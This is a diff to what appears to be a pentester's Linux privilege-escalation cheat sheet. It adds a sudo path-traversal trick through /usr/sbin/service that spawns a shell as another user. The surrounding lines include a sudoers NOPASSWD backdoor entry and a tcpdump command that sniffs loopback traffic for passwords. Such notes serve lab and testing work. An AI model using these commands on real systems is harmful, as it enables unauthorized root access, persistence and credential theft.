@@ -75,7 +75,7 @@ sudo --version    #Check version for exploits
 sudo -l    #Sudo capabilities of current user
 sudo -i    #Elevate directly to root by running i with sudo and supplying eve's or other admins credentials.
 echo targetUser ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers
-
+kali@kali:~$ sudo -u steven /usr/sbin/service ../../../bin/sh    #Use sudo -u to run /service or other command as different user if other user has "nopasswd sudo rights" on the /service or other file
 
 #TcpDump to Inspect Traffic (cannot be run without sudo permissions)
 #sudo tcpdump -i lo -A | grep "pass"    #capture traffic in and out of the loopback interface, dump its content in ASCII using  -A parameter. Filter traffic for the word "pass"
